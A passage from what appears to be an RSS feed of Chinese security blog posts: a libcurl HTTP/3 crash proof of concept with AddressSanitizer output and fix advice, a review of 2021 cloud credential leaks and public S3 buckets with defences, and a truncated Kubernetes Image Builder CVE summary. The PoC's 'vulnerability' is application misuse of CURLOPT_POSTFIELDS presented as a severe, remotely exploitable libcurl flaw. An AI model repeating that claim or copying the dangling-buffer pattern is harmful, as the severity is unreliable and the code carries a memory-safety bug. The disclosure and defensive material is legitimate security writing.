+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;curl/curl.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;CURL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;curl_easy_init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 栈分配缓冲区将在作用域外失效
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;body_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;257&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;memset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;body_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;body_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURLOPT_URL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;https://example.com/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURLOPT_HTTP_VERSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURL_HTTP_VERSION_3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURLOPT_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURLOPT_POSTFIELDS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;body_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 漏洞调用
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nf&#34;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURLOPT_TIMEOUT_MS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;50L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// body_data在此处超出作用域
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// libcurl在传输期间访问无效内存
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nf&#34;&gt;curl_easy_perform&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;curl_easy_cleanup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;编译并运行:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;clang -fsanitize&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;address http3_crash_poc.c -lcurl -o poc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./poc
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;崩溃输出&#34;&gt;崩溃输出
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;==3720==ERROR: AddressSanitizer: stack-use-after-scope on address 0x00016fa21470
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;READ of size 45 at 0x00016fa21470 thread T0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    #0 strlen
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    #1 Curl_pretransfer transfer.c:569
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    #2 multi_runsingle multi.c:2376
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    #3 curl_multi_perform multi.c:2756
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    #4 easy_transfer easy.c:705
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    #5 easy_perform easy.c:813
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SUMMARY: AddressSanitizer: stack-use-after-scope transfer.c:569 in Curl_pretransfer
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;技术分析&#34;&gt;技术分析
+&lt;/h2&gt;&lt;h3 id=&#34;根本原因&#34;&gt;根本原因
+&lt;/h3&gt;&lt;p&gt;漏洞源于libcurl的CURLOPT_POSTFIELDS行为：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;libcurl存储指针但不复制数据&lt;/li&gt;
+&lt;li&gt;应用程序的栈缓冲区在作用域退出后失效&lt;/li&gt;
+&lt;li&gt;libcurl稍后在Curl_pretransfer()中解引用无效指针&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;受影响代码路径&#34;&gt;受影响代码路径
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl_easy_setopt(CURLOPT_POSTFIELDS) →
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl_easy_perform() →
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Curl_pretransfer() →
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;strlen(invalid_pointer) →
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CRASH
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;文档: 明确说明CURLOPT_POSTFIELDS数据在传输完成前必须保持有效&lt;/li&gt;
+&lt;li&gt;API增强: 考虑添加边界检查或对栈检测指针自动复制&lt;/li&gt;
+&lt;li&gt;替代API: 推广更安全使用模式的CURLOPT_COPYPOSTFIELDS&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;影响&#34;&gt;影响
+&lt;/h2&gt;&lt;h3 id=&#34;安全影响&#34;&gt;安全影响
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;拒绝服务: 必然导致应用终止的崩溃&lt;/li&gt;
+&lt;li&gt;内存损坏: 释放后使用可能导致不可预测行为&lt;/li&gt;
+&lt;li&gt;潜在代码执行: 特定情况下内存损坏可能被用于控制流劫持&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;受影响场景&#34;&gt;受影响场景
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;使用libcurl进行HTTP/3 POST请求的应用程序&lt;/li&gt;
+&lt;li&gt;任何CURLOPT_POSTFIELDS指向栈分配内存的代码模式&lt;/li&gt;
+&lt;li&gt;特别影响:
+&lt;ul&gt;
+&lt;li&gt;HTTP/3客户端应用&lt;/li&gt;
+&lt;li&gt;使用栈缓冲区作为请求体的API客户端&lt;/li&gt;
+&lt;li&gt;堆使用受限的嵌入式系统&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;实际暴露&#34;&gt;实际暴露
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;语言绑定: 许多curl绑定可能无意中创建此模式&lt;/li&gt;
+&lt;li&gt;示例应用: CLI工具、网络爬虫、API客户端&lt;/li&gt;
+&lt;li&gt;严重性: 由于HTTP/3采用率增长和远程可利用性而较高&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>2021年云安全漏洞与数据泄露回顾：从凭证泄露到S3配置错误</title>
+        <link>http://localhost:1313/p/2021%E5%B9%B4%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E5%9B%9E%E9%A1%BE%E4%BB%8E%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E5%88%B0s3%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/</link>
+        <pubDate>Sun, 03 Aug 2025 23:09:59 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/2021%E5%B9%B4%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E5%9B%9E%E9%A1%BE%E4%BB%8E%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E5%88%B0s3%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/</guid>
+        <description>&lt;h1 id=&#34;2021年云安全漏洞与数据泄露回顾&#34;&gt;2021年云安全漏洞与数据泄露回顾
+&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
+&lt;/h2&gt;&lt;p&gt;云安全事件的实际数据往往缺乏细节，且存在幸存者偏差。本文聚焦2021年公开披露的云安全事件，不包括云服务提供商自身的漏洞。&lt;/p&gt;
+&lt;h2 id=&#34;2021年趋势&#34;&gt;2021年趋势
+&lt;/h2&gt;&lt;h3 id=&#34;静态凭证仍是主要初始访问途径&#34;&gt;静态凭证仍是主要初始访问途径
+&lt;/h3&gt;&lt;p&gt;静态长期凭证的泄露风险极高。计算表明：假设组织有10个静态凭证，每个每天有0.01%泄露风险，2年内至少一个凭证泄露的概率达52%。&lt;/p&gt;
+&lt;h4 id=&#34;实际数据泄露案例&#34;&gt;实际数据泄露案例
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Codecov&lt;/strong&gt;：公开Docker镜像包含GCP服务账户凭证，攻击者替换安装脚本窃取环境变量&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Juspay&lt;/strong&gt;：未回收的访问密钥被窃，导致3500万条支付数据泄露&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Kaspersky&lt;/strong&gt;：AWS SES令牌泄露用于发送钓鱼邮件&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Upstox/MobiKwik&lt;/strong&gt;：访问密钥泄露导致350万客户KYC数据外泄&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;漏洞案例&#34;&gt;漏洞案例
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;Glassdoor员工在GitHub公开AWS访问密钥&lt;/li&gt;
+&lt;li&gt;BeVigil发现40款流行Android应用内嵌AWS密钥&lt;/li&gt;
+&lt;li&gt;暴露的Apache Airflow实例泄露AWS凭证&lt;/li&gt;
+&lt;li&gt;SEGA Europe公开S3存储桶泄露多组凭证&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;恶意软件&#34;&gt;恶意软件
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;TeamTNT团伙窃取AWS/GCP/Docker凭证&lt;/li&gt;
+&lt;li&gt;攻击者利用Log4Shell漏洞窃取AWS凭证&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;公开s3存储桶问题&#34;&gt;公开S3存储桶问题
+&lt;/h3&gt;&lt;p&gt;2021年公开披露的S3存储桶数据泄露案例：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;公司&lt;/th&gt;
+          &lt;th&gt;数据类型&lt;/th&gt;
+          &lt;th&gt;影响用户数&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Hobby Lobby&lt;/td&gt;
+          &lt;td&gt;姓名/邮箱/地址/源码&lt;/td&gt;
+          &lt;td&gt;&amp;gt;30万&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Decathlon Spain&lt;/td&gt;
+          &lt;td&gt;姓名/邮箱/电话&lt;/td&gt;
+          &lt;td&gt;&amp;gt;7.8万&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Pixlr&lt;/td&gt;
+          &lt;td&gt;邮箱/哈希密码&lt;/td&gt;
+          &lt;td&gt;190万&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;MobiKwik&lt;/td&gt;
+          &lt;td&gt;KYC数据/交易日志&lt;/td&gt;
+          &lt;td&gt;350万(KYC)&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;SEGA Europe&lt;/td&gt;
+          &lt;td&gt;API密钥&lt;/td&gt;
+          &lt;td&gt;未披露&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;技术防护方案&#34;&gt;技术防护方案
+&lt;/h2&gt;&lt;h3 id=&#34;消除静态长期凭证&#34;&gt;消除静态长期凭证
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;人类用户&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用AWS SSO或IAM角色联合&lt;/li&gt;
+&lt;li&gt;通过SCP策略阻止IAM用户创建&lt;/li&gt;
+&lt;li&gt;使用aws-vault加密磁盘凭证&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;应用程序&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;优先使用EC2实例角色/Lambda执行角色&lt;/li&gt;
+&lt;li&gt;非AWS环境使用Hashicorp Vault&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;SaaS集成&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;创建专用IAM角色+随机ExternalID&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;扫描异常凭证&#34;&gt;扫描异常凭证
+&lt;/h3&gt;&lt;p&gt;推荐工具：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;代码扫描：detect-secrets/gitleaks/truffleHog&lt;/li&gt;
+&lt;li&gt;Docker扫描：SecretScanner/ggshield&lt;/li&gt;
+&lt;li&gt;GitGuardian可验证AWS凭证有效性&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;修复s3存储桶配置&#34;&gt;修复S3存储桶配置
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;基础措施&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;账户发现与清单&lt;/li&gt;
+&lt;li&gt;IaC扫描工具(tfsec/checkov)&lt;/li&gt;
+&lt;li&gt;启用账户级S3 Public Access Block&lt;/li&gt;
+&lt;li&gt;运行时扫描(Prowler/ScoutSuite)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;高级加固&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;VPC端点限制访问&lt;/li&gt;
+&lt;li&gt;客户管理KMS密钥加密&lt;/li&gt;
+&lt;li&gt;启用S3数据事件日志&lt;/li&gt;
+&lt;li&gt;使用PMapper分析访问权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;保护实例元数据服务&#34;&gt;保护实例元数据服务
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;通过SCP强制使用IMDSv2&lt;/li&gt;
+&lt;li&gt;EKS环境阻止Pod访问元数据服务&lt;/li&gt;
+&lt;li&gt;利用GuardDuty检测凭证外泄&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;结论&#34;&gt;结论
+&lt;/h2&gt;&lt;p&gt;2021年的攻击技术并无重大创新，这反而凸显了基础安全措施的重要性。预计2022年会出现更多类似事件，攻击者可能采用更高级的持久化技术。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;特别说明：本文作者目前就职于Datadog，但本文非公司赞助内容。&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>Kubernetes镜像构建器漏洞分析：CVE-2024-9486与CVE-2024-9594技术详解</title>
+        <link>http://localhost:1313/p/kubernetes%E9%95%9C%E5%83%8F%E6%9E%84%E5%BB%BA%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90cve-2024-9486%E4%B8%8Ecve-2024-9594%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3/</link>
+        <pubDate>Sun, 03 Aug 2025 18:35:15 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/kubernetes%E9%95%9C%E5%83%8F%E6%9E%84%E5%BB%BA%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90cve-2024-9486%E4%B8%8Ecve-2024-9594%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3/</guid>
+        <description>&lt;h3 id=&#34;摘要&#34;&gt;摘要
+&lt;/h3&gt;&lt;p&gt;近期披露的两个漏洞（CVE-2024-9486 CVSS 9.8和CVE-2024-9594 CVSS 6.3）影响Kubernetes镜像构建器，攻击者在特定条件下可利用这些漏洞获取Kubernetes节点的root权限。部分镜像构建提供商未在构建完成后禁用默认管理凭证，导致节点部署后可能被入侵。该问题已在Image Builder v0.1.38版本修复，建议用户重建并重新部署受影响镜像。&lt;/p&gt;
+&lt;h3 id=&#34;受影响系统及组件&#34;&gt;受影响系统及组件
+&lt;/h3&gt;&lt;p&gt;所有v0.1.37及更早版本的Image Builder均受影响，涉及以下提供商：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;最严重场景&lt;/strong&gt;：Proxmox&lt;/li&gt;
+&lt;li&gt;其他受影响提供商：Nutanix、OVA、QEMU和raw格式&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;技术细节攻击概述&#34;&gt;技术细节/攻击概述
+&lt;/h3&gt;&lt;h4 id=&#34;cve-2024-9486&#34;&gt;CVE-2024-9486
+&lt;/h4&gt;&lt;p&gt;该漏洞存在于使用Proxmox提供商的旧版Image Builder中。构建过程中启用的默认凭证未在完成后正确禁用，导致攻击者可通过残留凭证获取节点root权限。v0.1.38版本通过以下方式修复：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;构建期间仅生成随机临时密码&lt;/li&gt;
